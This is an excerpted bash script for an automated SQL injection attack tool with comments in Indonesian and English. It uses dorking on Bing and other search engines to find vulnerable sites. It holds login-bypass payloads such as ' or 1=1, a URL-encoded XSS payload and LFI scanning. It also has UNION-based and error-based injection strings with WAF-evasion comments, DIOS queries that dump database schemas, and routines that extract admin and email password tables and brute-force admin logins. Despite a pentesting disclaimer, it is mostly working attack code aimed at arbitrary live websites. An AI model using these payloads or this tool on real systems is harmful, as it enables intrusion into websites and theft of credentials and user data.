...
#confused about what language to use, so I'll just mix it up :v
#so indonesian people can understand english and english speakers can understand indonesian
#warning powerful tools xploiter can be harmful and detrimental
#USE THIS TOOL FOR GOOD PURPOSES TO HELP PENTESTING
#NOT FOR DESTROYING EVERYTHING, USERS BEAR ALL RESPONSIBILITY
#STRICTLY PROHIBITED TO MODIFY THEN PUBLISH WITH PERSONAL NAME WITHOUT AUTHOR'S KNOWLEDGE
#MADE OPEN SOURCE, SO IT CAN BE ADJUSTED TO INDIVIDUAL NEEDS
#I DON'T PROHIBIT EDITING EXISTING QUERIES, SO YOU CAN ALSO CREATE
#/////////////////////////////////////////////////////////////////////////
#//Author: by Kedjaw3n                                                  //
#//recode > reupload ?? please as long as you include the author name   //
#//I made this with effort, not to be misused, let alone reuploaded     //
#//Created: 15 - 07 - 2019                                              //
#//release: 17 - 01 - 2020                                              //
#//update : 21 - 04 - 2020                                              //
#//     AGAIN, DON'T REUPLOAD YOU ASSHOLE, I MADE THIS WITH EFFORT     //
#//          JUST USE IT, WHAT'S SO HARD YOU JERK                       //
#//                 NO NEED FOR SELF-PROMOTION                            //
#/////////////////////////////////////////////////////////////////////////
#bypass sql login
xpl="test" #don't change!!!
xpl1="' or 1=1 limit 1-- -+"
xpl2="'=''or'"
xpl3="admin"
xpl4="'=''or'@gmail.com"
...
BR="\033[0;34m"
U="\033[0;35m"
#recommended for those experienced with manual sqli
#Be careful if you want to change queries, pay attention to variables
#All existing variables are very sensitive and can completely change tool performance
#so pay attention to uppercase/lowercase letters okay.... :)
#HAPPY CREATING :")
time_out="30" #default timeout 30 seconds
corect="y" #auto corect
#output result
injected_site="injected.txt" #Result history of injected sites from first time psqli was used
result_vuln="vuln-sqli.txt" #Result vuln sqli sites from dorking 5 search engines
admin_site="admin-site.txt" #sites containing admin user pass
email_site="empass-site.txt" #sites containing email pass
error_site="error.txt" #sites that cannot be injected
dork_result="dork.txt" #result from dork generator
result_admin="login-site.txt" #login page results from admin finder
#input
union_select="union.txt" #contains union styles that you can edit as you like
list_country=".sites" #list containing country lock for dork generator
parameter_gen=".key" #list containing parameters for dork generator
...
#if you want to change dios table and column use ($table = for table) ($colom = for column)
...
xss_payload="%22%3e%3c%2f%64%69%76%3e%3c%68%31%3e%6b%65%64%6a%61%77%33%6e%3c%2f%68%31%3e" #XSS payload - if you want to change the alert, type "kedjaw3n"
lfi_count="5" #count of ../ dir LFI scan
...
for pkg in "${dependencies[@]}";do
    command -v $pkg >/dev/null 2>&1 || { echo -e >&2 "${O}$pkg ${N}: not installed - will install it" && apt-get install $pkg -y
    }
done
...
dorking() {
  echo -e "${N}\033[2mloading.... $dork\nuse ctrl-c to skip to next process\n${N}please wait make sure connection is fast and stable..." | tr "+" " ";rm -rf .result_dork .not
    COUNT="$hitung"
...
do
   ...
   if [ -z "$link" ]
   then
      echo -e "${R}Check connection or error occurred"
   fi
...
trap - INT
trap break INT
echo -e "${P}Get dork via articles and blogs"
echo -e "${N}[${R}?${N}] page: "
read page
if [[ "$page" = "" ]];then
    echo -e "${R}empty input"
else
...
then
  ...
  do
     ...
     if [ "$set" = "20" ]
     then
        echo -en "${G}process finished, want to add more dorks? y/n: ${O}"
        read pros
        if [ "$pros" = "y" ]
        then
...
run_sqli_with_quotes() {
  local original_site="$1"
  echo -e "\n[${O}?${N}] Select quote style for parameter injection:"
  echo -e "[${G}1${N}] No quote (Integer based)"
  echo -e "[${G}2${N}] Single quote (')"
  echo -e "[${G}3${N}] Double quote (\")"
  echo -e "[${G}4${N}] Auto identify"
  echo -ne "[${R}?${N}] Choose [1-4] or auto: "
  read q_choice
  ...
  if [ "$q_choice" == "1" ]; then
      ...
      site="${original_site}%27"
      sqli
  elif [ "$q_choice" == "3" ]; then
      site="${original_site}%22"
      sqli
  elif [ "$q_choice" == "4" ]; then
      echo -e "${N}[${O}*${N}] Auto identifying quote style..."

      site="$original_site"
      echo -e "\n${N}[${O}*${N}] Testing: No quote"
      sqli
      if cat output/$dir/log_query.txt 2>/dev/null | grep -q "DIOS"; then return; fi

      site="${original_site}%27"
      echo -e "\n${N}[${O}*${N}] Testing: Single quote"
      sqli
      if cat output/$dir/log_query.txt 2>/dev/null | grep -q "DIOS"; then return; fi

      site="${original_site}%22"
      echo -e "\n${N}[${O}*${N}] Testing: Double quote"
      sqli
  else
      site="$original_site"
      sqli
...
#update 26 - 11 - 2019
#Created by Kedjaw3n
#if you want to recode include the author name you jerk
#I made this with effort
#THx to Allah SWT
N='\033[0m'
R='\033[0;31m'
G='\033[0;32m'
...
intro() {
  ...
  echo -e "   USE THIS TOOL FOR GOOD PURPOSES TO HELP PENTESTING\n      NOT FOR DESTROYING EVERYTHING, USERS BEAR ALL RESPONSIBILITY"
  echo -e "            don't be evil because devil is in your mind\n                 [ Thx to agressiv1njector Team ]           \n"

}
adminfin() {
echo -e "${N}[${G}*${N}]\033[2m Searching for login page with dorking${N}"
pa="1"
trap break INT
...
echo -e "${BL}use ctrl+c to skip to next process\n${N}please wait make sure connection is fast and stable..."
trap break 2 INT
...
then
  ...
  do
   ...
   echo -e "${N}[${R}!${N}] ${R}\033[2mcheck connection or dorking results not found${N}"
fi
...
trap - INT
if [[ -f .live ]];then
   echo -e "${N}${BL}collecting found logins"
   ...
   echo -e "${R}\033[2mSorry failed to find the login page being searched\ntry changing wordlist and craft yourself"
   gagal="y"
fi
}
...
trap - INT
echo -e "${O}Trying admin no redirect"
echo -e "${BL}use ctrl+c to skip to next process\n${N}please wait make sure connection is fast and stable..."
trap break 3 INT
...
while read xploit
do
echo -e "${O}Trying login with: ${B}$xploit${N}"
...
if echo "$cek" | grep -Po "User|user|password|Password|Username|username|email|Email|salah|Salah|Gagal|coba|gagal|wrong|Wrong|Invalid|IncorectError|405|error" >/dev/null
 then
   echo -e "${R}Failed login with  : ${O}$xploit"
...
if [[ "$sukses" = "" ]];then
   ...
   echo -e "${N}Auto exploit failed try semi manual"
   for para in `echo "$param"`;do echo -e "$O~ ${N}$para";done
   echo -e "${R}~ ${N}leave empty to skip"
   echo -en "${G}enter parameter name: ${BL}"
   read param1
   while read xploit
   do
    echo -e "\n${O}Trying login with: ${B}$xploit${N}"
    echo -e "${P}post target to $posturl${N}"
...
if [[ "$sukses" = "" ]];then
   echo -e "${N}Auto exploit failed try manual\n"
   source=$(echo "$ng" | grep -Po "post\('[^']*'|POST\('[^']*'|(<input).*?(>)|action=\"[^\"]*\"")
   source1=$(echo -e "$ng" | grep -Po 'name="[^"]*|value="[^"]*|action="[^"]*' | tr -d '"' | sed "s|name=|Parameter Name => |g" | sed "s|value=|Value => |g" | sed "s|action=|post_target => |g")
   echo -e "${N}${P}$source\n\n${R}~ ${BL}description\n${N}${O}${P}$source1${N}\n${N}${P}example postdata: parameter_name=@&parameter_name=@&parameter_name=value\nexample post target: $postnya/post_target\n" | sed "s|//|/|g"
   echo -e "${R}~ ${N}leave empty to skip"
   echo -en "${G}enter postdata: ${BL}"
   read param1
   echo -en "${G}enter post method target: ${BL}"
   read tujuan
   if [[ "$param1" = "" ]] || [[ "$tujuan" = "" ]];then
      echo -e "${P}Your choice is empty"
   else
   while read xploit
   do
...
if [[ "$sukses" = "" ]];then
   echo -e "${R}Site cannot be bypassed or postdata error${N}"
fi
}
banner() {
  echo -e "
...
[${O}6${N}]. logout"
echo -ne "[${R}?${N}] which one ?? "
read n
case $n in
   1) clear
      banner
      echo -e "\033[1m$N[$R+$N] ${O}bypass login bruteforce"
      echo -en "\033[1m$N[$G!$N] Enter target: "
      read target
      bypass
      read -p "return to menu y/n? " tanya
      if [[ "$tanya" = "y" ]];then
         menu
      fi
   ;;
   2) clear
      ...
      echo -ne "\033[1m$N[$G!$N] Enter target list: "
      read tar
   ...
   3) clear
      ...
      echo -e "[${O}1${N}]. normal dorking"
      echo -e "[${O}2${N}]. mass dorking"
      echo -e "[${O}3${N}]. return to main menu"
      echo -ne "[${G}?${N}] which one ?? "
      read d
      case $d in
       1)
          clear
   ...
   5) clear
      ...
      1) clear
         ...
         read wordlistadmin
         echo -n "[+] Enter bypass login wordlist: "
         read wordlist
...
esql() {
  ...
  echo -ne "\x1b[0m${N}[${BL}`date +%T`${N}] trying to check vuln with comma "
  ...
  bla=$(diff -u .site .site2)
    if [[ "$bla" = "" ]]
    then
       echo -e "${N}[${R}\033[7mCRITICAL${N}] ${R}\033[2mNOT FOUND failed to find error page ${N}\n${N}[${R}*${N}] \033[2mforce inject ?? y/n "
       read paksa
       if [[ "$paksa" = "y" ]]
       then
           ...
           echo -e "\x1b[0m${N}[${BL}`date +%T`${N}] ${O}try manual injection"
        fi
    else
...
edump () {
  ...
  do
   ...
   do
     if [[ "$masn" = "y" ]];then
        echo -e "${N}\033[2mpress ctrl+c then ctrl+d to skip site${N}"
     else
        echo -e "${N}\033[2mpress ctrl+c then ctrl+d to exit${N}"
     fi
          ...
          then
              ...
              then
                 ...
                 then
                    ...
                    echo "$cor $colom"
                    table_ref="$db_na.$table"
                    if [[ "$waff"  = "on" ]];then
                       dump="+AND+/**8**/(SELECT+1+/*!50000FROM*/+(SELECT+COUNT(*),/*!50000CONCAT*//**8**/((SELECT(SELECT+/*!50000CONCAT*//**8**/(CAST(/*!50000CONCAT*//**8**/($colom)+AS+CHAR),0x7e))+/*!50000FROM*/+$table_ref+LIMIT+$roy,1),FLOOR(RAND(0)*2))x+/*!50000FROM*/+/*!50000INFORMATION_SCHEMA.TABLES*/+/*!50000GROUP*/+/*!50000BY*/+x)a)--+"
                    else
                       dump="+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT($colom)+AS+CHAR),0x7e))+FROM+$table_ref+LIMIT+$roy,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+"
                    fi
                    echo -e "${O}make sure the input name is correct${N}"
                    ...
                    if [[ "$waff"  = "on" ]];then
                       ...
                       then
                          if [ -f .output ];then
                             echo -e "${N}+$coi+"
                             echo -e "${N}${G}1.${N} Dump again\n${N}${G}2.${N} return to initial database${N}${G}\n3.${N} return to main menu"
                             if [[ "$masn" = "y" ]];then
                                echo -en "\n${BL}leave empty then press ENTER to skip to next site${N}"
                             fi
...
if echo -e "$cet" | grep -q -P -i 'Not Acceptable|blocked|connection was reset|Forbidden|forbidden|Not Acceptable|Internal Server Error'
then
    if [[ "$force_plain" != "y" ]]; then
        ...
        echo -e "${G}[*] PLAIN mode active - skipping WAF bypass in error()${N}"
    fi
fi
...
if [ "$db" = "" ]
then
   echo -e "\x1b[0m${N}[${R}\033[2m`date +%T`${N}] ${O}Failed to get DB${N}"
   fail="y"
else
   echo -e "${N}[${O}INFO${N}]${G} $dir injected ERROR Based method${O}"
   # --- CACHE SAVE ---
   mkdir -p output/$dir
   echo "SITE=$site" > output/$dir/injection_cache.txt
   echo "METHOD=error" >> output/$dir/injection_cache.txt
   echo "UNION_STR=$union" >> output/$dir/injection_cache.txt
   # ------------------
   ...
   do
      ...
      then
         ...
         echo -e "\n${R}$N[${R}\033[7;31mCRITICAL${N}]$O connection error: check URL again or server down$N" >&2
      fi
   done
   trap - INT
   ...
   then
      ...
      then
         dump_sqli="n"
         hex="database/**8**/()"
         echo -e "${O}\033[2mcheck injection direct....${N}"
      else
         echo -e "${O}make sure the input name is correct${N}"
         error
      fi
         ...
         do
            ...
            then
               ...
               then
                  ...
                  cp .table "output/$dir/.table" 2>/dev/null
                  echo " $table::$colom"
               fi
            fi
            else
...
echo -e "Nb: if you want to go directly to results press CTRL + C / vol down + C"
...
echo -e "[+] Total  : $(cat .0-$list 2>/dev/null | wc -l) Empass Not Cracked"
echo -e "[*] Thx for using this tools :')"
echo -en "${P}Press Enter to continue "
read lanjutkan
}
...
dir=$(echo $site | sed 's!http[s]*://!!g' | cut -d '/' -f1)
mkdir -p output/$dir
echo -en "${N}[${O}INFO${N}] ${O}scanning $site.......\n"
...
if [ $? -eq 0 ];then
  ...
  then
    ...
    echo -e "${R}[!] sqli inject point not found\ncheck output/$dir/crawled.txt to find inject point yourself${N}"
   fi
else
  echo "[!] failed to get url"
       ...
       echo -e "${R}connection error: check URL again or server down$N" >&2
fi
}
...
dora() {
  ...
  echo -e "${N}\033[2mloading.... $dork\nuse ctrl-c to skip to next process\n${N}please wait make sure connection is fast and stable..." | tr "+" " ";rm -rf .result_dork .not .url
    for COUNT in $(seq 1 $pa)
       do
         echo -e "${G}Result from bing page $COUNT${N}"
         curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --max-time $time_out -sL "http://www.bing.com/search?q=$dork&qs=n&pq=$dork&sc=8-5&sp=-1&sk=&first=$COUNT&FORM=PORE" | grep -Po '_blank" href="[^"]*' | sort -u | uniq -i | cut -d '"' -f3 | sed '/facebook/d' | sed '/google/d' | sed '/twitter/d' | sed '/microsoft/d' | sed '/youtube/d' | sed '/&amp/d' | sed "/amp;/d" >> .result_dork
   ...
   echo -e "${N}\033[2muse ctrl+c to skip to next process\n${N}please wait make sure connection is fast and stable..."
...
dump() {
         #echo -e "$by \n $waff"
          ...
          if [[ "$boot_empas" = "y" ]];then
          	         ...
          	         do
                          ...
                          do
                            ...
                            then
                               db_escaped=$(echo "$db_na" | sed 's/[]\\.*+?^${}()|[/]/\\&/g')
                               ump=$(echo "$ump" | sed "s/${db_escaped}\.//g")
                            fi
                            if [[ "$ump" = "r" ]]
                            then
          ...
          while [ $ok = 0 ]
           do
            echo -e "${N}\033[2mpress ctrl+c then ctrl+d to skip${N}"
                 ...
                 then
                    ...
                    then
                       ...
                       then
                          ...
                          # --> NEW: Hook for Plain Mode Dump <--
                          if [[ "$force_plain" = "y" ]]; then
                             echo -e "${G}[*] Dumping via Python Plain Module...${N}"
                             # Call python script in dump mode
                             local py_out="/tmp/.plain_dump_out"
                             local _py="python3"
                             command -v python3 &>/dev/null || _py="python"
                             $_py "$(dirname "$0")/plain_inject.py" "$_base" "$_ncols" "dump" "$table" "$co" > "$py_out"

                             if grep -q "ERROR=" "$py_out"; then
                                 echo -e "${R}[!] Dump failed${N}"
                                 cat "$py_out" | grep '^ERROR=' | cut -d'=' -f2-
                             else
                                 # Extract lines starting with DUMP=
                                 grep '^DUMP=' "$py_out" | cut -d'=' -f2- > "output/$dir/dump-$table.txt"

                                 local row_count=$(wc -l < "output/$dir/dump-$table.txt")
                                 echo -e "${N}Total Dumped :$G $row_count$N"

                                 if [ "$row_count" -gt 0 ]; then
                                     local col_count=$(echo "$co" | awk -F"," '{print NF}')
                                     local dashes=$(seq -s '-' $col_count | sed 's/[0-9]//g')

                                     echo -en "${N}retrived_db: ${G}mysql@$dbdir/$db_na/$table${N}~\n"
                                     echo -e "+$dashes+\n $colon \n+$dashes+$O" | sed 's/,0x3a3a,/ :: /g'
                                     cat "output/$dir/dump-$table.txt" | sort -u | uniq -i | sed 's/0x3a3a/ :: /g'
                                 fi
                             fi

                             # Break out of the current table dumping to let the user pick next action
                             break
                          fi
                          # --> END Hook <--
                          ...
                          do
                            ...
                            if [[ "$ump" = "r" ]]
                            then
                               echo -e "${N}[${O}INFO${N}] ${O}F A I L E D try dump dios manual$N\n\033[2mmake sure input is correct or check connection\nif input is correct the target column may be empty${N}"
                               echo -e "${N}${G}1.${N} Dump again\n${N}${G}2.${N} return to initial database${N}${G}\n3.${N} return to main menu"
                               if [[ "$masn" = "y" ]];then
...
run_sqli_with_quotes() {
  ...
  echo -e "[${G}3${N}] Double quote (\")"
  echo -e "[${G}4${N}] Auto identify"
  echo -e "[${G}5${N}] No quote + ${G}PLAIN${N} (force no WAF bypass)"
  echo -e "[${G}6${N}] Single quote + ${G}PLAIN${N} (force no WAF bypass)"
  echo -ne "[${R}?${N}] Choose [1-6] or auto: "
  read q_choice

  force_plain="n"
  skip_auto_identify="n"
  quote_override=""

  if [ "$q_choice" == "1" ]; then
      skip_auto_identify="y"
      quote_override=""
      site="$original_site"
      sqli
  elif [ "$q_choice" == "2" ]; then
      ...
      site="$original_site"
      sqli
  elif [ "$q_choice" == "5" ]; then
      force_plain="y"
      skip_auto_identify="y"
      quote_override=""
      waff="off"
      union="+and+0+union+select+"
      site="$original_site"
      echo -e "${G}[*] PLAIN mode: WAF bypass disabled${N}"
      sqli
  elif [ "$q_choice" == "6" ]; then
      force_plain="y"
      skip_auto_identify="y"
      quote_override="%27"
      waff="off"
      ...
      echo -e "${N}[${O}*${N}] Auto identifying quote style (using internal diff logic)..."
      site="$original_site"
      sqli
  else
      site="$original_site"
...
plain_inject() {
  local _base=$(echo "$site" | sed "s/'//g" | sed 's/%27//g')
  dir=$(echo "$_base" | sed 's!http[s]*://!!g' | cut -d '/' -f1)
  mkdir -p output/$dir
  ...
  if command -v python3 &>/dev/null; then
    ...
    echo -e "${R}[!] Python not found. Install python3 to use PLAIN mode.${N}"
    echo -e "${O}On Termux: pkg install python${N}"
    echo -e "${O}On Linux:  sudo apt install python3${N}"
    return
  fi

  # Pre-flight: check Python works
  if ! $_py -c "import urllib.request" 2>/dev/null; then
    echo -e "${R}[!] Python stdlib broken. Reinstall python3.${N}"
    return
  fi

  # Get cached column count
  local _ncols=""
  if [ -f output/$dir/injection_cache.txt ]; then
    _ncols=$(grep '^COLUMNS=' output/$dir/injection_cache.txt | cut -d'=' -f2)
  fi
  [ -z "$_ncols" ] && _ncols="0"

  echo -e "${G}[*] Running plain injection via $_py...${N}"

  # Call Python script: stdout (structured data) to file, stderr (progress) prints live to terminal
  $_py "$(dirname "$0")/plain_inject.py" "$_base" "$_ncols" > "output/$dir/plain_output.txt"
  local _rc=$?

  # Check for errors
  if [ $_rc -ne 0 ]; then
    echo -e "${R}[!] Plain inject failed${N}"
    grep '^ERROR=' "output/$dir/plain_output.txt" | cut -d'=' -f2-
    return
  fi

  # Parse structured results from stdout lines starting with KEY=
  local _db=$(grep '^DATABASE=' "output/$dir/plain_output.txt" | head -1 | cut -d'=' -f2-)
  local _ver=$(grep '^VERSION=' "output/$dir/plain_output.txt" | head -1 | cut -d'=' -f2-)
  local _usr=$(grep '^USER=' "output/$dir/plain_output.txt" | head -1 | cut -d'=' -f2-)

  if [[ -z "$_db" ]]; then
    echo -e "${R}[!] Could not extract database info${N}"
    return
  fi

  echo -e "\n${G}[+] Database : ${O}$_db${N}"
  echo -e "${G}[+] Version  : ${O}$_ver${N}"
  echo -e "${G}[+] User     : ${O}$_usr${N}\n"

  echo "Version: $_ver, User: $_usr, Database: $_db" > output/$dir/info.txt

  # Write table::column to .table
  rm -f .table
  grep '^COLUMN=' "output/$dir/plain_output.txt" | cut -d'=' -f2- > .table
  cp .table "output/$dir/.table" 2>/dev/null

  if [[ -s .table ]]; then
    local _coi=$(seq -s '-' 30 | sed 's/[0-9]//g')
    echo -e "${N}+$_coi+\n Table::Column\n+$_coi+${O}"
    cat .table | sort -u | uniq -i
    cp .table "output/$dir/.table" 2>/dev/null
    echo -e "${N}+$_coi+${N}"
    if cat .table | grep -aP "admin|login|user|pass" >/dev/null; then
      echo -e "\033[1;35m Found login access table${N}"
      cat .table | sort -u | uniq -i | grep -aP "admin|login|user|pass"
    fi
    dump_sqli="y"
    dump_name="n"
    dump
  else
    echo -e "${R}[!] No table data extracted${N}"
  fi
}
sqli() {
  corona="n"
  ...
  if [[ "$waff" = "on" ]];then
    ...
    if [[ "$force_plain" != "y" ]]; then
       union="/**8**/and/**8**/mod(9,9)/**8**/+/**8**/UnIoN/**8**/select/**8**/"
    fi
    echo -e "${N}[${G}*${N}]\033[2m Starting inject $site${N}"
  fi
  site=$(echo "$site" | sed "s/'//g" | sed "s/%27//g" | sed "s/%22//g") #sed 's!http[s]*://!!g'
  dir=$(echo $site | sed 's!http[s]*://!!g' | cut -d '/' -f1)
  # --- CACHE CHECK ---
  if [ -f output/$dir/injection_cache.txt ]; then
    cached_site=$(grep '^SITE=' output/$dir/injection_cache.txt | cut -d'=' -f2-)
    cached_method=$(grep '^METHOD=' output/$dir/injection_cache.txt | cut -d'=' -f2)
    cached_union=$(grep '^UNION_STR=' output/$dir/injection_cache.txt | cut -d'=' -f2-)
    cached_cols=$(grep '^COLUMNS=' output/$dir/injection_cache.txt | cut -d'=' -f2)
    cached_quote=$(grep '^QUOTE_TEST=' output/$dir/injection_cache.txt | cut -d'=' -f2)
    echo -e "\n${G}[CACHE] Previous scan found for $dir!"
    echo -e "  Method  : ${O}$cached_method${N}"
    [ -n "$cached_cols" ] && echo -e "  Columns : ${O}$cached_cols${N}"
    echo -e "  URL     : ${O}$cached_site${N}"
    echo -ne "${N}[${R}?${N}] Skip scanning and go straight to dump? [y/n]: "
    read skip_scan
    if [[ "$skip_scan" = "y" ]]; then
      union="$cached_union"
      quote_test="$cached_quote"
      # Restore DB name and Table list from cache if available
      if [ -f "output/$dir/info.txt" ]; then
        db_na=$(grep -Po 'Database: \K.*' "output/$dir/info.txt")
      fi
      if [ -f "output/$dir/.table" ]; then
        cp "output/$dir/.table" .table
      fi
      ...
      if [[ "$cached_method" = "union" ]]; then
        dump
      elif [[ "$cached_method" = "error" ]]; then
        edump
      fi
      return
    fi
  ...
  if [[ "$skip_auto_identify" = "y" ]]; then
      echo -e "\x1b[0m${N}[${BL}`date +%T`${N}] ${O}Bypassing auto detect -> direct to manual inject${N}"
      quote_test="$quote_override"
      union="${quote_override}${union}"
      inject
      if cat .tmp | grep "$order_by" >/dev/null; then
  ...
  if [[ "$html" = "y" ]]
    then
    m11=$(echo $site | awk -F "/" '{print $(NF)}' | cut -d "." -f1 | grep -o "[0-9]*" | head -1)
           if [[ "$m11" = "" ]]
            then
    ...
    then
       ...
       if [[ "$paksa" = "y" ]]
       then
           union=$(echo "$union" | sed "s/'//g" | sed "s/%27//g" | sed "s/%22//g")
           echo -e "\x1b[0m${N}[${BL}`date +%T`${N}] ${O}\033[2mUNION based injection method (INTEGER)${N}"
           quote_test=""
           inject
       ...
       then
           ...
           if cat .tmp | grep "$order_by" >/dev/null
           then
              echo -e "\x1b[0m${N}[${BL}`date +%T`${N}] ${G}\033[2mUNION based injection method (INTEGER)${N}"
              union=$(echo "$union" | sed "s/'//g" | sed "s/%27//g" | sed "s/%22//g")
              echo -e "$site" >/dev/null
              quote_test=""
              inject
...
info() {
  #echo -e "$by \n $waff"
   ...
   do
   if [[ "$force_plain" = "y" ]] && [[ "$us" != "$Dump_db" ]] && [[ "$us" != "oi" ]]; then
      continue
   fi
   if [[ "$us" = "oi" ]];then
      echo -e "${O}\033[2mGagal ambil nama db langsung dios${N}"
      # --- PLAIN UNION FALLBACK (uses %20 encoding) ---
      echo -e "${G}[*] Trying plain UNION SELECT fallback (no WAF bypass)...${N}"
      _plain_db=""
      # Build clean column list: 1,2,3,...,$i
      _num_cols="$i"
      # Try each reflected column from .angka
      for _pn in $(cat .angka | sort | head -5)
      do
        # Build column list replacing reflected col with concat(database(),0x7e)
        _cols=""
        for _cn in $(seq 1 $_num_cols); do
          if [[ "$_cn" = "$_pn" ]]; then
            _cols="${_cols}concat(database(),0x7e)"
          else
            _cols="${_cols}${_cn}"
          fi
          if [[ $_cn -lt $_num_cols ]]; then _cols="${_cols},"; fi
        done
        _plain_q="${site}%20UNION%20SELECT%20${_cols}%20--+-"
        echo -e "${O}[*] Testing column ${_pn}: ${N}\033[2m${_plain_q}${N}"
        _plain_db=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" \
          --max-time $time_out -sL "$_plain_q" | grep -Po '[a-zA-Z0-9_]{1,64}(?=~)' | head -1)
        if [[ -n "$_plain_db" ]]; then
          echo -e "${G}[+] DB found via plain UNION (col ${_pn}): ${O}$_plain_db${N}"
          break
        fi
      done
      if [[ -n "$_plain_db" ]]; then
        # Set state for normal dump flow
        db="$_plain_db"
        dbdir="$_plain_db"
        echo "$_plain_db" > .db
        waff="off"
        ...
        dump_sqli="y"
        read db_ro
        if echo "$db_ro" | grep -Poi "dios|di" >/dev/null; then
          dump_sqli="n"
          echo -e "${O}\033[2mcheck injection direct....${N}"
        fi
        if [[ "$corect" = "y" ]];then
        ...
        if [[ -z $db_na ]]; then db_na="$_plain_db"; fi
        asx="$db_na"
        hex=$(for ((ihex=0;ihex<${#asx};ihex++));do printf %02X \'${asx:$ihex:1};done)
        hex=$(echo "0x$hex")
        # Fetch tables via plain UNION using %20 encoding
        rm -rf .table
        echo -e "${G}[*] Fetching tables via plain UNION...${N}"
        for _tp in $(seq 0 49)
        do
          _cols2=""
          for _cn in $(seq 1 $_num_cols); do
            if [[ "$_cn" = "$_pn" ]]; then
              _cols2="${_cols2}concat(table_name,0x3a3a,column_name,0x7e)"
            else
              _cols2="${_cols2}${_cn}"
            fi
            if [[ $_cn -lt $_num_cols ]]; then _cols2="${_cols2},"; fi
          done
          _tq="${site}%20UNION%20SELECT%20${_cols2}%20FROM%20information_schema.columns%20WHERE%20table_schema=${hex}%20LIMIT%20${_tp},1%20--+-"
          _tr=$(curl -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" \
            --max-time $time_out -sL "$_tq" | grep -Po '[a-zA-Z0-9_]+::[a-zA-Z0-9_]+(?=~)' | head -1)
          if [[ -n "$_tr" ]]; then
            echo -e " ${O}$_tr${N}"
            echo "$_tr" >> .table
            cp .table "output/$dir/.table" 2>/dev/null
        ...
        if [[ -s .table ]]; then
          c=$(cat .table | awk -F "::" '{print NF-1}' | sort -rn | head -1)
          coi=$(seq -s '-' 30 | sed 's/[0-9]//g')
          echo -e "${N}+$coi+\n Table Name::colomn name\n+$coi+$O"
          cat .table | sort -u | uniq -i
          echo -e "${N}+$coi+"
          if cat .table | grep -aP "admin|login|user|pass" >/dev/null; then
          ...
          echo -e "${R}[!] Could not enumerate tables. Trying DIOS...${N}"
          lcvs="n"
          dump_sqli="n"
          dios
        fi
      else
        echo -e "${R}[!] Plain UNION also failed. Falling back to DIOS...${N}"
        lcvs="n"
        dump_sqli="n"
        dios
      fi
   ...
   then
      ...
      then
        df=$(echo $ngecur | grep -Po "kedjaw3n[0-9]*" | sed 's/kedjaw3n//g' | head -1)
        ...
        cat .angka |  sed 's/kedjaw3n//g' > .angka.tmp && mv .angka.tmp .angka
      fi
    if [[ "$based64" = "y" ]]
    then
    ...
    then
       ...
       then
          ...
          if [[ "$corona" = "y" ]];then
           ...
           if [[ "$force_plain" = "y" ]]; then
              local _site_neg=$(echo "$site" | sed -r 's/([?&][^=]+=)([0-9]+)/\1-\2/')
              dk=$(echo -e "${_site_neg}%20UNION%20SELECT%20$db")
           else
              dk=$(echo -e "$site$union$db")
           fi
       fi
       if [[ "$postd" = "y" ]]; then
          if [[ "$force_plain" = "y" ]]; then dk=$(echo -e "%20UNION%20SELECT%20$db"); else dk=$(echo -e "$union$db"); fi
    ...
    if echo "$dbnya" | grep -Po "Forbidden|forbidden|Not Acceptable|Internal Server Error" >/dev/null;then
       if [[ "$force_plain" != "y" ]]; then
          ...
          echo -e "${G}[*] PLAIN mode active - ignoring WAF block in info()${N}"
       fi
    fi
    echo "$dbnya" > .db
    ff=$(cat .db)
    ...
    if [[ "$force_plain" = "y" ]]; then
       us2="concat(0x6b65646a6177336e2656657273696f6e3a,version(),0x2655736572207365727665723a20,user(),0x2644617461626173653a20,database(),0x3c6b6564)"
       us1="$us2"
    else
        if [[ "$by" = "$w3" ]];then
    ...
    then
       ...
       if echo "$info" | grep -Po "Database" >/dev/null;then
          ...
          if [[ "$force_plain" != "y" ]]; then
             ...
             echo -e "${G}[*] PLAIN mode active - skipping server info bypass${N}"
             break
          fi
       fi
    fi
...
dios() {
  ...
  then
    ...
    if [[ "$dump_sqli" = "y" ]];then
        ...
        if [[ "$force_plain" = "y" ]]; then
           dios1="(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=$hex)and(0x00)in(@x:=concat(@x,0x3c6c693e,table_name,0x3a3a,column_name))))x)"
           dios2="(select(@khatulistiwa)from(select(@khatulistiwa:=0x00),(select(@khatulistiwa)from(information_schema.columns)where(table_schema!=$hex)and(@khatulistiwa)in(@khatulistiwa:=concat(@khatulistiwa,0x3c6c693e,table_name,0x3a3a,column_name))))khatulistiwa)"
           dios5="(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat(@x,0x3c6c693e,table_name,0x3a3a,column_name))))x)"
        else
           dios1="(select(@x)/*!50000from*/(/*!50000select*/(@x:=0x00),(select(0)/*!From*/(/*!50000information_schema.columns*/)/*!50000where*/(table_schema=$hex)and(0x00)in(@x:=/*!50000coNcat*/(@x,0x3c6c693e,/*!50000table_name*/,0x3a3a,/*!50000column_name*/))))x)"
           dios2="(select(@khatulistiwa)from(select(@khatulistiwa:=0x00),(select(@khatulistiwa)from(information_schema.columns)where(table_schema!=$hex)and(@khatulistiwa)in(@khatulistiwa:=concat(@khatulistiwa,0x3c6c693e,table_name,0x3a3a,column_name))))khatulistiwa)"
           dios5="(select(@x)/*!50000from*/(/*!50000select*/(@x:=0x00),(select(0)/*!From*/(/*!50000information_schema.columns*/)/*!50000where*/(table_schema=database/**_**/())and(0x00)in(@x:=/*!50000coNcat*/(@x,0x3c6c693e,/*!50000table_name*/,0x3a3a,/*!50000column_name*/))))x)"
        ...
        do
          ...
          then
             ...
             then
              ...
              if [[ -z "$in" ]]; then
                 echo -e "${R}\033[2mFAILED: column number not found, skipping dios${N}"
                 continue
              fi
             if [[ "$corona" = "y" ]];then
...
#====Dump dios biasa==========================================================================================
     ...
     if [[ "$local" = "y" ]];then
       ...
